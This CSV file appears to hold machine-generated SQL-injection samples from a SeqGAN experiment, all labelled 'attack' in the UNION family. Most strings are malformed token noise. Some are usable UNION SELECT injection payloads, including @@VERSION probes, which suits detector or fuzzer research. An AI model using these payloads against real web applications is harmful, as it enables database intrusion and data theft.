label,payload,family,payload_type,method,run_id,sample_index
attack,"-'ionsers""@)    )    )   union select fromrsrs,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,152
attack,"-2207''   )   )    )     Ot     )    )     union all all  all 3072,7497,@@VERSI   unionio all",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,153
attack,"-%"")    a  (  )    union select null,null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,154
attack,"-""",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,155
attack,"1 union all all where * )  (  (   union null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,156
attack,"1%''  )    )    )   ao1 1-- select,8123,3084,null,2446,2446,null,5756,9921,null,1646------",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,157
attack,1' union all all ' all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,158
attack,"-'+  (  select '%' union d  (     2088  =  =  =  1 union  select null,null,null,null,1980,null,null,null,null,null,null,null,null,null,null,null,null,null,1224#,4481,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,159
attack," select null,null----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,160
attack,"-4966""""   union all select @@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,161
attack,"-'  )  )    )    uniona,4481 id  s where union select null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,162
attack,"-'+  (  select '3990'   union all  all all 1,@@V",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,163
attack,"1'  )  )   .    )    )    union 1494eers union all  select 1,1297,2263,3072#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,164
attack,"1'  )    union select,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,165
attack,"-'$)    union all all all select select ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,166
attack,"1""    )    ) union all select ,7845,2446,3059,9357--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,167
attack,"1' union all 2285,null,3084,null,null,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,168
attack,"1'  )    )    )     )    union 2285-- ,3990,null,7348",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,169
attack,"-%""  )    )   union select null,3084,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,170
attack," select ,9357,7845,9357,,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,171
attack,"=  24461-- u  )    )    union 8890--44814600)    union --  g,null,@from,4909,@vrs i1@8890    )    )    )    )   )    h   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,172
attack,-)   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,173
attack,"-'+  (  select '4330 union 9988,null,null,null,8123,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,174
attack,"-55757296)   )    )    )t)   union all all select null,null,4300,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,175
attack,"-%'  i  '1'1 union all u where whereinsers'        (    )    )    )    ) union all all all select null,null,null,nullnull,null--null,null3084,1249,4481--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,176
attack,"-4542 all all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,177
attack,-1249   )    )    )    a4966se),union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,178
attack,"1%''  )a    )   union 1er  n  1'  )     )    )   where union all all select null,8123,9814--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,179
attack,"-3997h$N,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,180
attack,"1' -- 1 wherenull union all * 1l  -- null,null,null,null,4300,null,null,null,null,null,null,2446,4600,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,181
attack,"11    )   )    )    )   union all 1  d  )    )    )    )   as u  )    )    )  )    )   union all * null,null----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,182
attack,"-9860%'' u   1+(  =+union all select ,4300,2263,null,null,null,null,nullnull--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,183
attack," select all u,@)s--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,184
attack,"1'    )    )    )   union 7815 1-- all select 1,null,6996,3990,3990,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,185
attack,"-%'  )   union all select 5756,3084,8123,null,7845,2446,3084,null,null,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,186
attack,"1'  )    )    )     )   )   union all all null,null,null,null,null,null,1917,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,187
attack,"hs     )    )    )    union all from id  =  all -- all 1,1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,188
attack,"-6294""  )$  )        )    where union where 4481s 8268')    )    )    union all' selectnull,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,189
attack,"-'  1v)    )   union select 6737,1249,1297,2446,5349,2446,7348,8986,7845,5756,3084,null,3084,null,8123,4300,null,3084,3084,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,190
attack,"-%%'   union * -- all 1980,1980,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,191
attack,"-5349'""     )   union 8268  =  1+  )    union all all u  )   )  ))    )    )   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,192
attack,"-3072""""  )   )    )'     )   union null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,193
attack,"-6097'    )   )  )    )    as  = union all select 2446,1297,,null,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,194
attack,"-select' u   @  1   )   a5575  (    ))    )    d  2774      ) union all 1,ver where null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,195
attack,"'  =  =  =  '1'  )    bunion all selecte,3084,null,null,null,null,3072,null,null,null,null,3084,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,196
attack,"-'+  (  select '-'""  )    )    1980   union all 1,)where 1917  ((    )    )    )    )    )    )    )Ivunion all select null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,197
attack,-1134'  )   )     )    )    )    ) union all all select ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,198
attack,"-4542 union all all all $i,2285,null,null,2285,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,199
attack,=s     a  =select 1917esers all select @  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,200
attack,"1'N    )    )     )    )     )    )N null  where,'  )    )    )    )    )     union all all users id  =  d  =  =  =s select 7497,1917----null,9357,2285",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,201
attack,"-""   )    )  --7845  =  =  union select null,--null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,202
attack,"-3116'  )    )    union 1 id  =  )    )   )    )    )    union all select u,us,where eonull,null,null,null,null,null,null,null,null,null,null,null,null,null,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,203
attack,"1'' or$ \$  =  =  l2774 select io1494,1297,7845,,,#7348,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,204
attack,"-' union all all select null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,205
attack,1'  )   )  )     )     )    union all all where union 1441--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,206
attack,"-')     )   union * all 1-- null,null,3059,vnull,null,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,207
attack,"1all select null,3059,,null,null,null,null,null,null#,5756,5756--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,208
attack,"-''  )\union all union 4300,null1297,9814,9110,3072",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,209
attack,"-8521""  )    union all select null,u,null,null,null,null,null,null,null,3084,1917--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,210
attack,-5575     )   )    )    union all' id  =  =  1)   (    )    )    )    )    a  =$)    union all select  7497r--@VES--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,211
attack,"-2207' where =all select 2263,2446,3339,null,1249,1441,3990,4909,6996--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,212
attack,"-t6075' 1 union select ,,1441,8665--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,213
attack,-6737s'  )   where  )    )   =6667)  1)   )    )     union 1 union  select,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,214
attack,"-t, null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,215
attack,"-'+  (  select 'o('' union select all 9921,#N8123,99213339,8986,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,216
attack,"-""  where union , null,null#,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,217
attack,"-'  )     -- select null,null,null,null,null,9921,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,218
attack,"1'  )    )     )     )    )    union all all select null,null,null,null,null,null,8123,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,219
attack,"1'   )   R)   union select 4909,8123,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,220
attack,"--     ""   )    )    n, all all select null,-,null,,null,null,null,null,3480,1917--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,221
attack,"-%""   )    )   )    aa'  )    )    )    union select null,1980,9814,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,222
attack," all all -- select 8123,6996,7497,7348,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,223
attack,on-'  (   )    )   8521 s union all$ where issers,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,224
attack,"-2207%''  )    )    )    )    )    union all -- 9988,1646,8986--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,225
attack,"-2207'  1401   uniona""  )   )    )    )   union select 3084,7497,@--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,226
attack,"-4589'   )  )    )       =  all all all all select null,""--,9322,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,227
attack,"1'2088  )   union all all null,8986,,8986,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,228
attack,"-)     3084     ""     )   -- 1)     )   where where union null,null,null,null,null,null,3990,null,null,null,9357,null,null,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,229
attack,-4589'    union all u  =  1 where'  =  (   u,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,230
attack,"--'    )    )    @\\='1'  =  =  =  union select 5349,9110--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,231
attack,"-''  )   a  )    as where union select null,null,null,null,null,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,232
attack,"-#""8268""%'   )    union all select @,vidusersers where where  )  = all all select,null,3990,null,2446,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,233
attack,"-)     )    union 1 ers where  eselect usrsesersersers,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,234
attack,"1')   '   .  )    )    )    )  )     )    ) where id  =  2774  =  '1' union select null,7845,null,null,null,null,null,5756,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,235
attack,"-'   )    )    union all select where --,null,null,null,null,null,null,3072,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,236
attack,-O union * all all union null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,237
attack,"-k'    )   )    )    )    where union all all null,null,null,null,null,null,null,null##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,238
attack,-d  2774 union 6996ses,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,239
attack,"-496622639860 a  =  )   union all 1297,2446,,null,7497,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,8665,null,null48543990,null,null,null,null,null,8986--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,240
attack,"-""  )   S e  =iaseers where  =  =  = union all select null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,241
attack,"-""$ union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,242
attack,"-"")    )    )     )    union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,243
attack,"-80735131%')    )    )    )    )  2571  )      =  =  )      union all all 1-- 6737,1441,null,null4481",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,244
attack,"12207 where where where . union all  all select 5349,3059,9357,1249,null,8665,null,null,4909,null,5349,3084,3072,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,245
attack,"-(     )     1297)    )""     )   union all all select null,null,null,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,246
attack," select select,4600,9110,4266,null,null,null,null,4300,null,null,null,null,null,null,null,null,null,null,null--,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,247
attack,"all select  all null,null,9322--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,248
attack,"-8812%'s union all select null,--r,8986,7497,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,249
attack,"1 union * select 4600,null,3084,3339--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,250
attack,"1)   where' i select 9110,null#8123,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,251
attack,1'    )   union select @s i--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,252
attack,"-    ,4330')    )e""1 where where  id  =  =  d  =  or select 1980,@V,5349,8986,5349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,253
attack,"-3378"" union all all5756 3059,2446,5756,8665#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,254
attack,"-88129860'  )    )     )    )   union all select select 2263,null,null,null#,5349,8123,3084,9322,null,null,8123,8986,8665--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,255
attack,"1'  )   union all all select,3339,9110,7497,,9357,',8986,3084,1224,4854,1297--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,256
attack,-9110r%'  )    )   union all all all -- -- 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,257
attack,-1134 i1  )   )    N -- us,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,258
attack,"-4373    1)    )    )   )    union select null,7497,null,null,null,null,null,null,null,null,null,null,3339,null,null,null,null,null,null,4600,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,259
attack,"- union select null,null,1441,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,260
attack,"-
#)     )    )'(   union all \h8890,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,261
attack,"-h'union null,null,null,null,null,null,null,null,null,null,null,null,null,null,1646,5756",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,262
attack," union select fromrR   3072serser  )    asersio-d)    )   )   )    )   )    )    )     whereid  =  =  $     2571 where union all select 9357,null,null,null,null,null,null,null,,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,263
attack,"-)   )   union all 1er  s where  =  =  =  =  1 union all select null,9814,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,264
attack,"-3""' union 1%ers' wherev1494)    ase,null'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,265
attack,"-43734205  oall select null,null,null,4909,null,null,null,null,4481,4481,null,null,null#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,266
attack,"-3378'   union null,1249,3084,null,6737,null,'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,267
attack,"-1401"")   )    )    )  =  =  = +  =  1 selectnull,null,4481,null,8123,5349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,268
attack,"-)   union null,9357,null,null#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,269
attack,"  1 union select 9814,null,null  ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,270
attack,select null,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,271
attack,-1249#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,272
attack,"-6996""  )   )    )   union * all select null,null,null----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,273
attack,"-)    )   union $ all select null,null,3339,3072,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,274
attack,"9156'e  )     )     )    )   )    4205N union select null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275
attack,"-8073%'1)     union all O d  (    )  )    )    )  )  )    union all 1646o8890 -- select 2263,3339,4909,@,5756,4909--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276
attack,"1'   )   )    )    )    union all all1eO -- null,null,null,7497e",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277
attack,"'  )    ,@or 1917  -- i1swhere (    )    )   )    )    )    )    )    )  )   union 1O    )   i<serns -- select null,null,1646,null,null,,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278
attack,"1union where 78151  )   )    )    =1  )   a  where'  )    )    union all select 7845,,6737,9357,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279
attack,"-7497'    )    )    )    where id  all all select from,3339,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280
attack,"- in)   )    vselect null,null,1441null,null,null,3072,null,null,null,null,null,7497,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281
attack,"-'  )    )    )    )   union all all select 3990,3990,v,4600,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282
attack,"1    ),ver6097    ))%h)    )   union select null,3084,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283
attack,"-a""%',where'%  )    )    )    )    )    )     )   union u \2088 union all 1980 union null,9357,null,null,null,7497,null,3339,null,null,null,4909,null,6737,null,8665,null,null,null,null,null,null,null,3084,null,null9357#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284
attack,-91102190'',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285
attack," -'  )    '+  (  select '=  (    )    N -)    union 8665,7497--,2263,4909--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286
attack,"1''  )    )    )   select 5349--1297(where v)    )    )    )  )'  )     )   union select null,7497,4481,7845,1917,1224,M#,5756,5756,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287
attack,"1  )    )'  union all select null#,null,null,null,null,2446,null,5756,',5349,3084,null,3072,1980#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288
attack,"--5748'')   7815  =  av)    union$ where whereons all select where 14949517 where null,null,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289
attack,"-%""    )   union null,4600,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290
attack,"-""'  )   where union select null,  ,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291
attack,"-""""",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292
attack," u<o1eser(  )    )     )    null' 2011  '1'% union all  all gselect select u,s,4481,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293
attack,"-5748 all all select ,7497@VRSIerser  )     )     ) where  =  select 1980,--,3990,4854,4300",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294
attack,"-""  )    )   union all -- select null,null,null,1249,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295
attack,"-'  (  =  =1  .   1 union select 3084,null,null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296
attack,"1''  )    )  )    =1  )    )    union all select null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297
attack,"-6075'  )    )  =  )    )  )    )    )    v)')   8890 union or select 8665,null,null,3084,null,null8986--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298
